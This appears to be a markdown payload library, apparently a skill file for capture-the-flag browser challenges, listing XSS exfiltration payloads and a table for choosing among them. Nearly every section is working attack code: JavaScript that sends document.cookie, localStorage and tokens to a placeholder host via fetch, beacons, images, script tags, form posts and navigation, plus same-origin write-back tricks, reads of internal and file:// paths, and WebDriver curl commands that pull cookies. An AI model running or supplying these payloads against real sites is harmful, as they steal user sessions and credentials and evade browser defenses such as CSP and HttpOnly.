# Payload variants — the exfil and probe payload library

## Canary payloads (prove execution)

```javascript
// DOM marker — visible in page.content()
document.title='CANARY';document.body.setAttribute('data-x','1');

// console marker — visible in the console hook
console.log('CANARY '+Math.random());

// network marker — visible in the request log / your listener
fetch('https://TUNNEL/canary?x=1');
new Image().src='https://TUNNEL/c.png?x=1';
```

## Cookie/token exfil payloads

```javascript
// the flag is the bot's cookie
fetch('https://TUNNEL/?c='+encodeURIComponent(document.cookie));

// HttpOnly cookie — exfil what a same-origin request carries
fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://TUNNEL/?d='+btoa(t)));

// localStorage / sessionStorage
fetch('https://TUNNEL/?ls='+encodeURIComponent(JSON.stringify(localStorage)));

// a specific token field
fetch('https://TUNNEL/?t='+encodeURIComponent(localStorage.token));
```

## Same-origin write-back payloads (egress blocked)

```javascript
// write the flag to a field you can read back
fetch('/api/profile',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({bio:document.cookie})});

// store it in a comment/note you can fetch
fetch('/api/notes',{method:'POST',body:'note='+document.cookie});

// put it in a same-origin page you can navigate to
fetch('/api/settings',{method:'POST',body:'x='+document.cookie});
```

## Beacon / fire-and-forget payloads (short wait)

```javascript
// survives navigation, no await needed
navigator.sendBeacon('https://TUNNEL/?c='+encodeURIComponent(document.cookie));

// image — subresource CSP often looser than connect-src
new Image().src='https://TUNNEL/i.png?c='+encodeURIComponent(document.cookie);

// script tag
var s=document.createElement('script');s.src='https://TUNNEL/j.js?c='+document.cookie;document.body.append(s);
```

## Internal-read payloads (the browser reaches the flag)

```javascript
// read a same-origin flag page and exfil its text
fetch('/flag').then(r=>r.text()).then(t=>fetch('https://TUNNEL/?f='+btoa(t)));

// read an internal API the bot's origin can reach
fetch('http://localhost:8080/internal').then(r=>r.text()).then(t=>fetch('https://TUNNEL/?f='+btoa(t)));

// read the flag element the admin page renders
fetch('/admin').then(r=>r.text()).then(t=>fetch('https://TUNNEL/?f='+btoa(t.match(/flag\{[^}]+\}/)[0])));
```

## WebDriver `execute` payloads (attack surface)

```bash
# cookie / storage via execute
curl -s .../execute/sync -d '{"script":"return document.cookie","args":[]}'
curl -s .../execute/sync -d '{"script":"return JSON.stringify(localStorage)","args":[]}'

# same-origin read via execute
curl -s .../execute/sync -d '{"script":"return fetch(\"/flag\").then(r=>r.text())","args":[]}'

# file read via JS when navigation blocked
curl -s .../execute/sync -d '{"script":"return fetch(\"file:///flag\").then(r=>r.text())","args":[]}'
```

## Frame/top navigation payloads

```javascript
// navigate the top frame to your listener with the flag
top.location='https://TUNNEL/?c='+document.cookie;

// open a new window
window.open('https://TUNNEL/?c='+document.cookie);

// form post exfil (works when fetch is blocked)
var f=document.createElement('form');f.action='https://TUNNEL/';f.method='POST';
var i=document.createElement('input');i.name='c';i.value=document.cookie;f.append(i);document.body.append(f);f.submit();
```

## The payload-selection logic

| Constraint | Reach for |
|---|---|
| just proving execution | canary — `document.title`, a marker fetch |
| flag is the cookie | `document.cookie` exfil |
| cookie is HttpOnly | a same-origin request that rides it |
| egress blocked | same-origin write-back |
| CSP blocks fetch | `Image`, `script`, form, beacon |
| short wait | beacon/image (fire-and-forget) |
| flag is a same-origin page | fetch it, exfil the text |
| need the browser's own read | `execute` on the endpoint |

The payload is the exfil *channel* choice — the injection that carries
it is `../web-xss/`'s problem, not this skill's.
